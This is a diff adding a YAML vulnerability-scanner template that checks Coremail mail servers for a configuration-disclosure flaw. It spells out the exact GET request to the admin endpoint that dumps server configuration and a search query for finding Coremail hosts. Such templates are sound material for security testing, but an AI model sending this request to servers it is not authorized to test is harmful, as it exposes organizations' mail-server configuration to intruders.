@@ -1,0 +1,17 @@
+name: Coremail Config Disclosure
+manual: true
+query: app="Coremail"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
+    expression: response.status == 200 && response.body.bcontains(b"configHome")
+expression: r0()
+detail:
+  links:
+  - https://www.secpulse.com/archives/107611.html
+  description: Coremail mail system is a large-scale enterprise mail system independently
+    developed, and it is the first Chinese mail system in China.
+  tags: infoleak
